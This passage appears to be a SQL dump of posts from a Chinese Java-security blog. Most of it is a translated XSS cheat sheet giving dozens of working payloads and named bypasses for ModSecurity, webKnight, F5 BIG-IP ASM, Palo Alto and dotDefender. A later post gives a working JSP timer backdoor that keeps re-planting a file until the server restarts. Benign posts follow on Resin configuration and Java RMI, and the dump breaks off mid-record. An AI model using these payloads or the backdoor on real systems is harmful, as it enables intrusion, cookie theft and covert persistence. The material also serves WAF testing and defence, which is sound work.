data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=&quot;&gt;\n&lt;object/data=//goo.gl/nlX0P?</pre>\n<p></div></p>\n<p><strong>code属性：</strong></p>\n<p><div></p>\n<pre>&lt;applet code=&quot;javascript:confirm(document.cookie);&quot;&gt; // Firefox Only\n&lt;embed code=&quot;http://businessinfo.co.uk/labs/xss/xss.swf&quot; allowscriptaccess=always&gt;</pre>\n<p></div></p>\n<p><strong>事件处理：</strong></p>\n<p><div></p>\n<pre> &lt;svg/onload=prompt(1);&gt;\n &lt;marquee/onstart=confirm(2)&gt;/\n &lt;body onload=prompt(1);&gt;\n &lt;select autofocus onfocus=alert(1)&gt;\n &lt;textarea autofocus onfocus=alert(1)&gt;\n &lt;keygen autofocus onfocus=alert(1)&gt;\n &lt;video&gt;&lt;source onerror=&quot;javascript:alert(1)&quot;&gt;</pre>\n<p></div></p>\n<p><strong>最短向量：</strong></p>\n<p><div></p>\n<pre>&lt;q/oncut=open()&gt;\n&lt;q/oncut=alert(1)&gt; // Useful in case of payload restrictions.</pre>\n<p></div></p>\n<p><strong>嵌套：</strong></p>\n<p><div></p>\n<pre>&lt;marquee&lt;marquee/onstart=confirm(2)&gt;/onstart=confirm(1)&gt;\n&lt;body language=vbsonload=alert-1 // Works with IE8\n&lt;command onmouseover =&quot;\\x6A\\x61\\x76\\x61\\x53\\x43\\x52\\x49\\x50\\x54\\x26\\x63\\x6F\\x6C\\x6F\\x6E\\x3B\\x63\\x6F\\x6E\\x66\\x69\\x72\\x6D\\x26\\x6C\\x70\\x61\\x72\\x3B\\x31\\x26\\x72\\x70\\x61\\x72\\x3B&quot;&gt;Save&lt;/command&gt; // Works with IE8</pre>\n<p></div></p>\n<p><strong>当圆括号被阻塞时使用throw：</strong></p>\n<p><div></p>\n<pre>&lt;a onmouseover=&quot;javascript:window.onerror=alert;throw 1&gt;</pre>\n</div>\n<strong>另一个变种：</strong>\n<div>\n<pre>&lt;img src=x onerror=&quot;javascript:window.onerror=alert;throw 1&quot;&gt;</pre>\n</div>\nChrome和IE中，上面的向量会抛出一个\"uncaught\"，然而可以使用十六进制戏法\n<div>\n<pre>&lt;body/onload=javascript:window.onerror=eval;throw&#039;=alert\\x281\\x29&#039;;</pre>\n</div>\n<strong>expression属性：</strong>\n<div>\n<pre>&lt;img style=&quot;xss:expression(alert(0))&quot;&gt; // Works upto IE7.\n&lt;div style=&quot;color:rgb(&#039;&#039;&amp;#0;x:expression(alert(1))&quot;&gt;&lt;/div&gt; // Works upto IE7.\n&lt;style&gt;#test{x:expression(alert(/XSS/))}&lt;/style&gt; // Works upto IE7</pre>\n<p></div></p>\n<p><strong>location属性：</strong></p>\n<p><div></p>\n<pre>&lt;a onmouseover=location=’javascript:alert(1)&gt;click\n&lt;body onfocus=&quot;location=&#039;javascrpt:alert(1) &gt;123</pre>\n<p></div></p>\n<p><strong>其他载荷：</strong></p>\n<p><div></p>\n<pre>&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;url=//goo.gl/nlX0P&quot;&gt;\n&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;javascript&amp;colon;alert(1)&quot;/&gt;\n&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;&lt;g onload=&quot;javascript:\\u0061lert(1);&quot;&gt;&lt;/g&gt;&lt;/svg&gt; \n&lt;svg xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot;&gt;&lt;a&gt;&lt;circle r=100 /&gt;&lt;animate attributeName=&quot;xlink:href&quot; values=&quot;;javascript:alert(1)&quot; begin=&quot;0s&quot; dur=&quot;0.1s&quot; fill=&quot;freeze&quot;/&gt; \n&lt;svg&gt;&lt;![CDATA[&gt;&lt;imagexlink:href=&quot;]]&gt;&lt;img/src=xx:xonerror=alert(2)//&quot;&gt;&lt;/svg&gt; &lt;meta content=&quot;&amp;NewLine; 1 &amp;NewLine;;JAVASCRIPT&amp;colon; alert(1)&quot; http-equiv=&quot;refresh&quot;/&gt;\n&lt;math&gt;&lt;a xlink:href=&quot;//jsfiddle.net/t846h/&quot;&gt;click</pre>\n<p></div></p>\n<p><strong>当 = ( ) ; : 都不被允许时的XSS载荷：</strong></p>\n<p><div></p>\n<pre>&lt;svg&gt;&lt;script&gt;alert&amp;#40/1/&amp;#41&lt;/script&gt; // Works With All Browsers\n//　　( is html encoded to &amp;#40\n//　　) is html encoded to &amp;#41</pre>\n<p></div></p>\n<p><strong>Opera中的变种：</strong></p>\n<p><div></p>\n<pre>&lt;svg&gt;&lt;script&gt;alert&amp;#40 1&amp;#41 // Works with Opera Only</pre>\n</div>\n<strong>实体解码：</strong>\n通常那个WAF都会对输入进行解码，你应该测试一下你所遇到的WAF是否会进行实体解码。下面给出的例子不是一个孤立有效的XSS向量，然而有时候WAF会将其解码形成完美的javascript语法，然后你就能绕过了\n<div>\n<pre>&amp;lt;/script&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;\n&lt;a href=&quot;j&amp;#x26;#x26#x41;vascript:alert%252831337%2529&quot;&gt;Hello&lt;/a&gt;</pre>\n<p></div></p>\n<p><strong>4.1.4 编码</strong></p>\n<p>javascript是一门十分灵活的语言，我们可以灵活的使用多种类型编码，如十六进制、Unicode、HTML。然而他们对载荷编码都有某些的规则。有时候WAF解码实体时情况有所不同，这里是一个特定属性的列表，其后是他们支持的编码方式。</p>\n<p>属性：</p>\n<p><div></p>\n<p><div><span style=\"font-family: Consolas, Monaco, monospace; font-size: 12px; line-height: 18px;\">href=</span></div></p>\n<pre>action=\nformaction=\nlocation=\non*=\nname=\nbackground=\nposter=\nsrc=\ncode=</pre>\n<p></div></p>\n<p><strong>支持的编码</strong>: HTML, 八进制, 十进制, 十六进制, Unicode</p>\n<p><strong>属性:</strong>data=　　<strong>支持的编码</strong>：base64</p>\n<p><strong>4.1.5 基于上下文的过滤</strong></p>\n<p>web应用过滤器一个很大的问题是它们不理解上下文黑名单能阻塞单独的javascript脚本，但对于防范XSS却并不是那么有效。原因在于我们并不是每次都需要一个单独的向量来执行javascript脚本，很多时候我们的输入会被反射，这种情况下我们不需要单独的javascript脚本来执行有效的javascript语句，看几个例子：</p>\n<p><strong>属性中的输入反射：</strong></p>\n<p><div></p>\n<pre>&lt;input value=&quot;XSStest&quot; type=text&gt;</pre>\n</div>\n显然我们可以使用 &gt;&lt;imgsrc=x onerror=prompt(0);&gt;, 这样的语句，我们使用&gt;闭合input标签然后插入自己的载荷。然而，有时候我们的&lt;&gt;会被转义或过滤掉，我们可以使用相似的方法绕过并执行我们的javascript脚本\n<div>\n<pre>autofocusonfocus=alert(1)//</pre>\n</div>\n基本上我们在最前面使用\"来闭合标签中的值然后执行我们的事件处理函数：\n<div>\n<pre>&quot; onmouseover=&quot;prompt(0) x=&quot;\n&quot; onfocusin=alert(1) autofocus x=&quot;\n&quot; onfocusout=alert(1) autofocus x=&quot;\n&quot; onblur=alert(1) autofocus a=&quot;</pre>\n<p></div></p>\n<p><strong>&lt;script&gt;标签中的输入反射：</strong></p>\n<p><div></p>\n<pre>&lt;script&gt;\nVar x=”Input”; &lt;/script&gt;</pre>\n<p></div></p>\n<p>我们现在面临的是不允许&lt;&gt;的情况，因此我们不能使用一个已有的属性如\"&gt;&lt;/script&gt;。然而，在这种情况下我们不需要闭合脚本属性来执行JavaScript，因为我们的输入已经反射在script标签中了。我们可以直接调用alert()、prompt()、confirm()函数执行有效的JavaScript代码，下面的输入会触发一个alert</p>\n<p><div></p>\n<pre>“;alert(1)//</pre>\n</div>\n双引号和分号会闭合已有的属性，然后alert函数就会执行，这里是它实际执行的情况：\n<div>\n<pre>&lt;script&gt;\nVar x=”“;alert(1)//”; &lt;/script&gt;</pre>\n<p></div></p>\n<p><strong>非常规的事件监听：</strong></p>\n<p>很多时候需要在JavaScript中使用非常规的事件处理，如DOMfocusin、DOMfocusout，这些事件让事件监听得到适当的执行</p>\n<p><div></p>\n<pre>&quot;;document.body.addEventListener(&quot;DOMActivate&quot;,alert(1))//\n&quot;;document.body.addEventListener(&quot;DOMActivate&quot;,prompt(1))//\n&quot;;document.body.addEventListener(&quot;DOMActivate&quot;,confirm(1))//</pre>\n<p></div></p>\n<p>这里是同种类的事件处理函数：</p>\n<p><div></p>\n<pre>DOMAttrModified\nDOMCharacterDataModified\nDOMFocusIn\nDOMFocusOut\nDOMMouseScroll\nDOMNodeInserted\nDOMNodeInsertedIntoDocument\nDOMNodeRemoved\nDOMNodeRemovedFromDocument\nDOMSubtreeModified</pre>\n<p></div></p>\n<p><strong>href上下文：</strong></p>\n<p>另外一个你经常会遇到的上下文是href标签中的输入：</p>\n<p><div></p>\n<pre>&lt;a href=”Userinput”&gt;Click&lt;/a&gt;</pre>\n</div>\n这种情况下，我们只需直接插入JavaScript，用户点击就会执行\njavascript:alert(1)//\n完整的语句为：\n<div>\n<pre>&lt;a href=”javascript:alert(1)//”&gt;Click&lt;/a&gt;</pre>\n<pre>&lt;span style=&quot;font-family: Georgia, &#039;Times New Roman&#039;, &#039;Bitstream Charter&#039;, Times, serif; font-size: 13px; line-height: 19px;&quot;&gt;大多数你遇到的黑名单过滤器都回删掉JavaScript关键字或者查找冒号后面的javaScript。这种情况下你可以使用HTML实体编码和URL编码来绕过黑名单，href标签会自动解码实体。如果还是不行，你可以试试vbscript，该伪协议在IE10和data URI中都能支持。&lt;/span&gt;</pre>\n</div>\n<strong>Javascript变种：</strong>\n下面是几个JavaScript变种：\n<div>\n<pre>javascript&amp;#00058;alert(1)\njavaSCRIPT&amp;colon;alert(1)\njaVaScRipT:alert(1)\njavas&amp;Tab;cript:\\u0061lert(1);\njavascript:\\u0061lert&amp;#x28;1&amp;#x29\njavascript&amp;#x3A;alert&amp;lpar;document&amp;period;cookie&amp;rpar;</pre>\n<p></div></p>\n<p><strong>vbscript变种：</strong></p>\n<p><div></p>\n<pre>vbscript:alert(1);\nvbscript&amp;#00058;alert(1);\nvbscr&amp;Tab;ipt:alert(1)&quot;</pre>\n<p></div></p>\n<p><strong>Data URl:</strong></p>\n<p><div></p>\n<pre>data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==</pre>\n</div>\n<strong>Json上下文：</strong>\n在encodeURIComponent中插入JavaScript代码，很容易触发XSS并在所有的浏览器中执行\n<strong>输入反射：</strong>\nencodeURIComponent(\'userinput\')\n例如：-alert(1)-\n-prompt(1)-\n-confirm(1)-\n执行结果就是\n<div>\n<pre>encodeURIComponent(&#039;-alert(1)-&#039;)</pre>\n</div>\n<strong>svg标签中的输入反射：</strong>\nsvg中的用户输入有点不同，HTML5的到来使得svg的使用得到戏剧性的增加。使用它也引发了很多问题，试想如下场景，你的输入被反射到&lt;svg&gt;里面的&lt;script&gt;标签中\n<div>\n<pre>&lt;svg&gt;&lt;script&gt;varmyvar=”YourInput”;&lt;/script&gt;&lt;/svg&gt;</pre>\n</div>\n当我们提交如下输入时：www.site.com/test.php?var=text”;alert(1)//\n有时候双引号会被编码，但它仍是有效的javascript语法并会得到执行\n<div>\n<pre>&lt;svg&gt;&lt;script&gt;varmyvar=&quot;text&amp;quot;;alert(1)//&quot;;&lt;/script&gt;&lt;/svg&gt;</pre>\n</div>\n至于它会执行的是因为在HTML中引入了额外的上下文(XML)，解决方法可以对字符进行两次编码\n<strong>5.1 浏览器Bug</strong>\n之前提到过，绕过web应用过滤器的关键在于我们比WAF提供商更好的了解浏览器，只有当我们理解了浏览器的工作方式才有可能找到bug并利用其为我所用。这一节我们会谈一谈浏览器的bug\n<strong>5.1.2 字符集Bug</strong>\n字符集bug在IE中也很常见，第一个字符集bug是UTF-7，然而我们并不会去讨论，它只对以前的浏览器有效。但我还是会谈到一个比较好玩的场景，我们可以在现代浏览器中执行JavaScript脚本。字符集定义了页面编码的方式，大部分internet网站使用的是utf-8编码，当然也有一些使用的是其他编码方式。如果你能通过篡改参数将页面的编码方式改为你选择的，我们可以绕过99.99%的WAF和例如html特殊字符的防御方式，当然这种情况也十分少见。\n试想一下下面这个场景，下面的应用使用html特殊符号，或者你碰到了一个会编码输入的WAF，字符集参数定义了默认的编码方式为utf-8\nhttp://xsst.sinaapp.com/utf-32-1.php?charset=utf-8&amp;v=XSS\n我们注入测试载荷并观察返回结果;\nhttp://xsst.sinaapp.com/utf-32-1.php?charset=utf-8&amp;v=”&gt;&lt;img src=x onerror=prompt(0);&gt;\n<a href=\"http://javaweb.org/wp-content/uploads/2014/01/04.jpg\"><img class=\"alignnone size-full wp-image-522\" title=\"04\" src=\"http://javaweb.org/wp-content/uploads/2014/01/04.jpg\" alt=\"\" width=\"619\" height=\"137\" /></a>\n这样我们就有了一个可以设置字符集的参数，可以将其改为utf-32并注入基于utf-32的载荷：\n<div>\n<pre>∀㸀㰀script㸀alert(1)㰀/script㸀</pre>\n</div>\n当我们注入上面的载荷时，它就会被编码为我们设置的utf-32，然后编码页面为utf-8，表现为如下：\n<div>\n<pre>&quot;&lt;script&gt;alert (1) &lt;/ script&gt;</pre>\n</div>\n<strong>最终的poc如下：</strong>\n<div>\n<pre>http://xsst.sinaapp.com/utf-32-1.php?charset=utf-　　\n32&amp;v=%E2%88%80%E3%B8%80%E3%B0%80script%E3%B8%80alert(1)%E3%B0%80/script%E3%B8%80</pre>\n<p></div></p>\n<p>上面的攻击载荷会在IE9及之前的版本执行JavaScript代码，它能在IE9中执行是因为IE不仅无法识别utf-32(当然firefox也无法识别)，而且IE直到IE9都不会处理空字节(0x00),而Chrome和safari都可以识别utf-32</p>\n<p><strong>5.1.3 空字节</strong></p>\n<p>如果你有编程基础的话，你对空字节一定不会感到陌生，它们通常用于字符串终结符。IE9之前的版本都会忽略空字节，而这可以帮我们规避许多web应用程序过滤器，因为它们可能并不会过滤空字符。几个月前，我用空字符绕过了mod_security的xss过滤器，如下；</p>\n<p><div></p>\n<pre>&lt;scri%00pt&gt;alert(1);&lt;/scri%00pt&gt;\n&lt;scri\\x00pt&gt;alert(1);&lt;/scri%00pt&gt;\n&lt;s%00c%00r%00%00ip%00t&gt;confirm(0);&lt;/s%00c%00r%00%00ip%00t&gt;\n&lt;!--空字节直到php5.3.8还能奏效&gt;</pre>\n<p></div></p>\n<p><strong>5.1.4 解析bug</strong></p>\n<p>RFC文档声明了节点名不能是空格，这意味着下面的代码不能运行</p>\n<p><div></p>\n<pre>&lt;script&gt;alert(1);&lt;/script&gt;\n&lt;%0ascript&gt;alert(1);&lt;/script&gt;\n&lt;%0bscript&gt;alert(1);&lt;/script&gt;</pre>\n<p></div></p>\n<p>不妨试想一下，过滤器在节点名开始处就查找字符(a-z)并将其过滤掉。但是如果我们可以注入其它如% , // , !等的特殊符号，我们就可能绕过旧版本的IE过滤器。原因是旧版本IE的攻击载荷，例如&lt;%,&lt;//,&lt;!,&lt;?会被解析为&lt;，然后我们就可以在这些字符后面注入攻击载荷了，下面是几个例子;</p>\n<p><div></p>\n<pre>&lt;// style=x:expression\\28write(1)\\29&gt; // Works upto IE7\n&lt;!--[if]&gt;&lt;script&gt;alert(1)&lt;/script --&gt; // Works upto IE9\n&lt;?xml-stylesheet type=&quot;text/css&quot;?&gt;&lt;root style=&quot;x:expression(write(1))&quot;/&gt;</pre>\n<p></div></p>\n<p><strong>5.1.5 Unicode分隔符</strong></p>\n<p>在Unicode字符集中有一些分隔符，比如空格，每个浏览器都有它自己的分隔符。当你碰上一个有着良好规则的WAF，它们通常会拦截所有的事件处理函数，阻塞所有事件处理函数的正则表达式如下所示：</p>\n<p>[on\\w+\\s*]</p>\n<p>上面的正则表达式会查找所有以on*开通的字符串并将其删除，元字符\"\\s\"的问题是它不包含一些分隔符，如x0b</p>\n<p>为了确定每个浏览器的有效分隔符，我们可以从0x00到0xff进行模糊测试，幸运的是已经有人为每个浏览器编出了一个有效分隔符的列表：</p>\n<p><div></p>\n<pre>IExplorer= [0x09,0x0B,0x0C,0x20,0x3B]\nChrome = [0x09,0x20,0x28,0x2C,0x3B]\nSafari = [0x2C,0x3B]\nFireFox= [0x09,0x20,0x28,0x2C,0x3B]\nOpera = [0x09,0x20,0x2C,0x3B]\nAndroid = [0x09,0x20,0x28,0x2C,0x3B]</pre>\n<p></div></p>\n<p>上面所有这些分隔符中，oxb是比较难搞懂的，mod_security使用类似上面描述的正表达式，我用下面的poc又一次绕过了mod_security</p>\n<p><div></p>\n<pre>&lt;a/onmouseover[\\x0b]=location=&#039;\\x6A\\x61\\x76\\x61\\x73\\x63\\x72\\x69\\x70\\x74\\x3A\\x61\\x6C\\x65\\x72\\x74\\x28\\x30\\x29\\x3B&#039;&gt;rhainfosec</pre>\n</div>\n下面的python代码会打印出从0x00到0xff的所有字符：\n<div>\n<pre>count = 0\nfori in xrange(0x00,0xff):\ncount += 0x1\nprintchr(i),\nprint count</pre>\n<p></div></p>\n<p><strong>5.2.1 缺失X-frame-Options</strong></p>\n<p>经常存在一个误解，认为x-frame options是用来防范点击劫持漏洞的，不过防止网站被攻陷可以使你免于无穷无尽的漏洞</p>\n<p><strong>5.2.2 Docmodes</strong></p>\n<p>IE在很久前引入了doc-mode,用于提供向后的兼容性，然而这也暴露了一些风险。设想如果攻击者能攻下你的网站，他也可以引入doc-mode并执行CSS表达式：</p>\n<p>expression(open(alert(1)))</p>\n<p>下面的poc会插入IE7仿真器并将一个网站地址置于iframe中</p>\n<p><div></p>\n<pre>&lt;html&gt;\n&lt;body&gt;\n&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=EmulateIE7&quot; /&gt;\n&lt;iframe src=&quot;https://targetwebsite.com&quot;&gt;\n&lt;/body&gt;\n&lt;/html&gt;</pre>\n<p></div></p>\n<p><strong>5.2.3 Window.name</strong></p>\n<p>名称对象告诉我们窗口的名字，在这样一个场景我们可以加载页面，在iframe中我们也能控制窗口的名字，我们可以执行javaScript脚本并绕过长度的限制，在设想一下我们可以攻陷一个网站却不能注入\"javascript:alert(1)\"</p>\n<p><strong>POC：</strong></p>\n<p><div></p>\n<pre>&lt;iframe src=&#039;http://www.target.com?foo=&quot;xss autofocus/AAAAA onfocus=location=window.name//&#039; name=&quot;javascript:alert(&quot;XSS&quot;)&quot;&gt;&lt;/iframe&gt;</pre>\n</div>\n参数位置相当于\"window.name\"，因为我们已经控制了名称属性，我们可以将名字设置为“javascript:alert(xss)”，再然后，我们就可以执行javascript脚本了\n<strong>6.1 基于DOM的XSS</strong>\n服务端的过滤器无法应对基于DOM的XSS，原因在于基于DOM的XSS其XSS攻击向量总是在客户端执行，看一下最简单的例子：\n<div>\n<pre>&lt;script&gt;\nvari=location.hash;\ndocument.write(i);\n&lt;/script&gt;</pre>\n<p></div></p>\n<p>上面的JavaScript获取location.hash的输入，location.hash后面传递的任何东西都不会发给服务器，接下来基于用户的输入通过document.write属性直接打印给DOM而没有任何JavaScript转义，这会导致基于DOM的XSS</p>\n<p>在一些场合下我们会将一个反射型XSS转换为基于DOM的XSS以避开过滤器，看一下这个POC：</p>\n<p><div></p>\n<pre>http://www.target.com/xss.php?foo=&lt;svg/onload=location=/java/.source+/script/.source+location.hash[1]+/al/.source+/ert/.source+location.hash[2]+/docu/.source+/ment.domain/.source+location.hash[3]//#:()</pre>\n</div>\n上面的POC仅当[及.和+被允许时才有效，我们可以使用location.hash来注入所有不被允许的字符。上面的场景中(,)和:不被允许，然而[,.和+是被允许的。因此，我们在     想注入不允许字符的地方使用location.hash[index]进行插入。\n<div>\n<pre>Location.hash[2]= ( // Defined at the second position after the hash. \nLocation.hash[3] = ) // Defined at third position after the hash.\nLocation.hash[1] = : // Defined at the first position after the hash.</pre>\n<p></div></p>\n<p>基于DOM的XSS的唯一障碍是客户端的过滤器，我们会在一个单独的页面里看一下绕过的方法</p>\n<p><strong>7.1 绕过</strong></p>\n<p>通过调整cheat sheet里的攻击载荷，我们能绕过大多数流行的WAF，我们决定有一些方法等到厂商修复后再公布，以免违背道德黑客精神</p>\n<p><strong>7.1.1 绕过ModSecurity</strong></p>\n<p><div></p>\n<pre>&lt;scri%00pt&gt;confirm(0);&lt;/scri%00pt&gt;\n&lt;a/onmouseover[\\x0b]=location=&#039;\\x6A\\x61\\x76\\x61\\x73\\x63\\x72\\x69\\x70\\x74\\x3A\\x61\\x6C\\x65\\x72\\x74\\x28\\x30\\x29\\x3B&#039;&gt;rhainfosec</pre>\n<p></div></p>\n<p><strong>7.1.2 绕过webKnight</strong></p>\n<p><div></p>\n<pre>&lt;isindex action=j&amp;Tab;a&amp;Tab;vas&amp;Tab;c&amp;Tab;r&amp;Tab;ipt:alert(1) type=image&gt;\n&lt;marquee/onstart=confirm(2)&gt;</pre>\n<p></div></p>\n<p><strong>7.1.3 绕过F5 BIG IP ASM and Palo ALTO</strong></p>\n<p><div></p>\n<pre>&lt;table background=&quot;javascript:alert(1)&quot;&gt;&lt;/table&gt;</pre>\n</div>\n上面的向量仅在IE6和更早版本中的opera有效，在写这些的时候我们确实还有一些对F5、BIG IP和Palo ALTO有效的向量，使用这些向量可以在现在的浏览器中执行JavaScript脚本。不过，在我们决定不公开的时候供应商也正在忙着修复这些问题\n这是另一个可以绕过F5 BIG IP ASM的：\n<div>\n<pre>“/&gt;&lt;marquee onfinish=confirm(123)&gt;a&lt;/marquee&gt;</pre>\n</div>\n<strong>7.1.4 绕过Dot Defender</strong>\n<div>\n<pre>&lt;svg/onload=prompt(1);&gt;\n&lt;isindex action=&quot;javas&amp;tab;cript:alert(1)&quot; type=image&gt;\n&lt;marquee/onstart=confirm(2)&gt;</pre>\n<p></div></p>\n<p><strong>结论：</strong></p>\n<p>到这里可以得出结论，黑名单不是一个完美的解决方案，也无法成为完美的解决方案；黑名单可以节省时间，然而，它使得应用相比白名单有更多地漏洞。我们希望能像WAF供应商推荐下面这些最佳实践</p>\n<p>1)开发人员和管理员应该记住，除非漏洞从源代码级别打上了补丁，否则WAF只是用于已知的漏洞控制器/参数的短时间内的安全机制</p>\n<p>2)给WAF的签名数据库及时更新并在上线前对其进行测试以确保按预期的方式运行</p>\n<p>3)WAF仅当配置有特定控制器/参数的签名时才能提供帮助，因此它需要手工定义期望的值得类型、最小/最大长度、content-type等参数以确保WAF在遇到入侵请求时能知道什么时候该阻塞、什么时候该报警</p>\n<p>4)如果WAF依赖于黑名单，你要让你的签名库保持最新并周期性地核实WAF维护者发布的新签名，确保它可以阻塞已知的浏览器bug</p>\n<p><strong>0x3 后记</strong></p>\n<p>翻译到这里就算结束了，在内容和质量上相比乌云上的那篇其实并没有什么突破，排版方面也比较草率。不得不说的是，写一篇自己的博客真的很耗时间，以上一篇博客为例，跟这篇一样是翻译的，但是由于前者文字较多，而且原文也比较随意，加上自己英语水平还有很大改进空间，花了很长时间。大致变成中文后，考虑到这种技术性的paper都会附有代码和截图，在排版等方面也得稍微花点时间，最终完成后，自己对该篇博客内容的理解也有了更深的理解，在这里向那些写paper的达人们致敬。以前在博客上写东西是作为笔记用的，自己需要的时候可以随手查阅，但是慢慢发现这样做的时候常常会太过于随意，也缺乏深入的思考，不太可取，还是发点有内容的东西吧。发博客是记录个人成长的一种很好的方式，也能促发人进行深入的思考或研究，翻译是一件不错但辛苦的事，不管怎么样也限于中国制造，我们需要的更多地是中国创造。</p>', null, '2014-01-14 17:18:07', '1', '568', null, '0', '2014-03-11 17:58:22');
INSERT INTO `sys_posts` VALUES ('529', '1', '19', 'Resin 4.x app-default.xml配置文件加载问题', '园长', '今天在调试Resin4.x的时候发现反复修改：conf/app-default.xml都无效，记得以前在windows下测试Resin4没啥问题的。仔细看了下才发现原来Resin4后app-default.xml的加载位置从Resin3默认的conf/app-default.xml变成了加载lib/resin.jar下的META-INF/caucho目录下的app-default.xml了（classpath:META-INF/caucho/app-default.xml）。\n<p>解决办法很简单，把conf/resin.xml下的<strong>classpath:META-INF/caucho/app-default.xml</strong>换成<strong>${resin.home}/conf/app-default.xml</strong>就会加载conf下的app-default.xml配置文件了。</p>\n<p>Resin集群配置：</p>\n<p>测试发现Resin4.029目录结构发生了变化，从resin.xml里面把cluster-default配置移到外面的cluster-default.xml了。默认导入了cluster-default.xml(Resin集群默认配置文件)，所以<strong>在Resin版本4.0.29以上需要修改：cluster-default.xml</strong>依旧是把<strong>classpath:META-INF/caucho/app-default.xml</strong>换成<strong>${resin.home}/conf/app-default.xml就行了</strong></p>\n<p>Resin4.0.23-4.0.24 conf/resin.xml默认配置:</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2014/01/12.jpg\"><img class=\"alignnone size-full wp-image-530\" title=\"1\" src=\"http://javaweb.org/wp-content/uploads/2014/01/12.jpg\" alt=\"\" width=\"891\" height=\"525\" /></a></p>\n<p>Resin3 conf/resin.conf默认配置：</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2014/01/2.jpg\"><img class=\"alignnone size-full wp-image-535\" title=\"2\" src=\"http://javaweb.org/wp-content/uploads/2014/01/2.jpg\" alt=\"\" width=\"891\" height=\"525\" /></a></p>\n<p>Resin4.0.29-4.0.x默认集群配置:</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2014/01/13.jpg\"><img class=\"alignnone size-full wp-image-541\" title=\"1\" src=\"http://javaweb.org/wp-content/uploads/2014/01/13.jpg\" alt=\"\" width=\"1141\" height=\"729\" /></a></p>', null, '2014-01-15 21:35:55', '1', '755', null, '0', '2014-01-16 11:41:22'), ('544', '1', '3', 'Java Timer 后门', '园长', '程序每秒执行一次无限循环，一次执行直到服务器重启。哪怕是删除jsp文件一样会无限循环！\n<pre class=\"brush: actionscript3; gutter: true\">http://localhost:8080/timer.jsp?path=/a/x/1.txt&amp;file=/xxxx/1.txt</pre>\n请勿用于黑产，否则母鸡鸡。\n<pre class=\"brush: java; gutter: true\">&lt;%!\n  void copy(java.io.File path,java.io.File file){\n    try{\n      java.io.FileOutputStream fos = new java.io.FileOutputStream(path);\n      java.io.FileInputStream fis = new java.io.FileInputStream(file);  \n        byte[] b = new byte[1024];\n        int n;\n        while ((n = fis.read(b)) != -1){\n          fos.write(b, 0, n);\n        }\n        fos.flush();\n        fos.close();\n        fis.close();\n    }catch(Exception e){\n      e.printStackTrace();\n    }\n  }\n%&gt;\n&lt;%\n  final java.io.File  file = new java.io.File(request.getParameter(&quot;file&quot;));\n  final java.io.File  path = new java.io.File(request.getParameter(&quot;path&quot;));\n  java.util.Timer executeSchedule = new java.util.Timer();\n  executeSchedule.schedule(new java.util.TimerTask() {\n    public void run(){\n      if(!path.exists()){\n        copy(path, file);\n      }\n    }\n  }, 0, 1000);\n%&gt;</pre>', null, '2014-01-16 18:01:15', '1', '558', null, '0', '2014-01-17 10:26:57'), ('556', '1', '3', 'Java RMI Demo', '园长', '<pre>RmiTest.java</pre>\n<pre class=\"brush: java; gutter: true\">import java.net.MalformedURLException;\nimport java.rmi.AlreadyBoundException;\nimport java.rmi.Naming;\nimport java.rmi.RemoteException;\nimport java.rmi.registry.LocateRegistry;\npublic class RmiTest {\n	public static void main(String[] args) {\n		try {\n			LocateRegistry.createRegistry(9527);//注册端口9527\n			Naming.bind(&quot;rmi://localhost:9527/test&quot;, new RmiTestImpl());//绑定Remote对象\n		} catch (RemoteException e) {\n			e.printStackTrace();\n		} catch (MalformedURLException e) {\n			e.printStackTrace();\n		} catch (AlreadyBoundException e) {\n			e.printStackTrace();\n		}\n	}\n}</pre>\n<pre>RmiTestImpl.java</pre>\n<pre class=\"brush: java; gutter: true\">import java.rmi.RemoteException;\nimport java.rmi.server.UnicastRemoteObject;\npublic class RmiTestImpl extends UnicastRemoteObject implements RmiTestInterface {\n	private static final long serialVersionUID = 1L;\n	protected RmiTestImpl() throws RemoteException {\n		super();\n	}\n	@Override\n	public void test() throws RemoteException {\n		System.out.println(&quot;Hello.RMI.&quot;);\n	}\n}</pre>\n<pre>RmiTestInterface.java</pre>\n<pre class=\"brush: java; gutter: true\">import java.rmi.Remote;\nimport java.rmi.RemoteException;\npublic interface RmiTestInterface extends Remote {\n	public void test() throws RemoteException;\n}</pre>\n<pre>Test.java</pre>\n<pre class=\"brush: java; gutter: true\">import java.net.MalformedURLException;\nimport java.rmi.Naming;\nimport java.rmi.NotBoundException;\nimport java.rmi.RemoteException;\npublic class Test {\n	public static void main(String[] args) {\n		try {\n			RmiTestInterface rt = (RmiTestInterface) Naming.lookup(&quot;rmi://localhost:9527/test&quot;);//调用远程方法\n			rt.test();\n		} catch (MalformedURLException e) {\n			e.printStackTrace();\n		} catch (RemoteException e) {\n			e.printStackTrace();\n		} catch (NotBoundException e) {\n			e.printStackTrace();\n		}\n	}\n}</pre>\n<p>参考:http://lavasoft.blog.51cto.com/62575/91679</p>', null, '2014-01-19 11:20:45', '1', '537', null, '0', '2014-01-19 14:30:10'), ('561', '1', '3', 'Java NIO trick and trap', '园长', 'FROM:http://jm-blog.aliapp.com/?p=536\n<p>作者：伯岩-淘宝</p>\n<p>下载地址：<a href=\"http://pan.baidu.com/s/1eQn8H5S\">NIO trick and trap.pdf.zip</a></p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2014/01/nio.png\"><img class=\"alignnone size-full wp-image-562\" title=\"nio\" src=\"http://javaweb.org/wp-content/uploads/2014/01/nio.png\" alt=\"\" width=\"565\" height=\"408\" /></a></p>', null, '2014-01-19 14:11:58', '1', '546', null, '0', '2014-01-19 14:12:25'), ('567', '1', '14', '攻击JavaWeb应用[1-9]', '园长', '<a href=\"http://p2j.cn/uploads/file/20180410/javaweb-1-9.doc\">攻击JavaWeb应用[1-9].doc</a> \r\n<p>\r\n	<a href=\"http://p2j.cn/uploads/file/20180410/javaweb-1-9.pdf\">攻击JavaWeb应用[1-9].pdf<br />\r\n</a> \r\n</p>\r\n<pre class=\"brush: java; gutter: 